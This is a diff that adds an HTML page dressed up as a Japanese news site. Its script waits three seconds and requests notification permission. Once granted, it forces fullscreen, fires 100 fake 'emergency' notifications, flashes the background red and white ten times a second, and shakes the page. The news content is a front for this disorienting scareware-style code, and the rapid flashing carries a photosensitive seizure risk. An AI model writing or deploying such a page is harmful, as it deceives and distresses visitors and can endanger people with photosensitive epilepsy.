@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>ニュースサイト</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 2em;
+      transition: background-color 0.1s;
+    }
+  </style>
+</head>
+<body>
+  <h1>最新ニュース</h1>
+  <p>本日は晴天です。気温は25度、穏やかな一日となるでしょう。</p>
+  <p>このサイトはChromeブラウザでの通知をサポートしています。</p>
+
+  <script>
+    function requestAndStartEffects() {
+      if (Notification.permission !== 'granted') {
+        Notification.requestPermission().then(permission => {
+          if (permission === 'granted') {
+            startEffects();
+          }
+        });
+      } else {
+        startEffects();
+      }
+    }
+
+    function startEffects() {
+      // フルスクリーン化
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
+      }
+
+      // 通知連続送信
+      let count = 0;
+      const notifInterval = setInterval(() => {
+        if (count >= 100) {
+          clearInterval(notifInterval);
+          return;
+        }
+        new Notification('🚨 緊急通知 #' + (count + 1), {
+          body: 'これはデモ用の通知です。',
+          icon: 'https://upload.wikimedia.org/wikipedia/commons/7/7e/Google_Chrome_icon_%282011%29.png'
+        });
+        count++;
+      }, 300);
+
+      // 背景点滅
+      let flash = false;
+      setInterval(() => {
+        document.body.style.backgroundColor = flash ? '#ffffff' : '#ff0000';
+        flash = !flash;
+      }, 100);
+
+      // 上下揺れ
+      let offset = 0;
+      setInterval(() => {
+        offset = offset === 0 ? 5 : 0;
+        document.body.style.marginTop = offset + 'px';
+      }, 50);
+    }
+
+    // 3秒後に通知リクエストとフルスクリーン演出
+    window.onload = () => {
+      setTimeout(requestAndStartEffects, 3000);
+    };
+  </script>
+</body>
+</html>
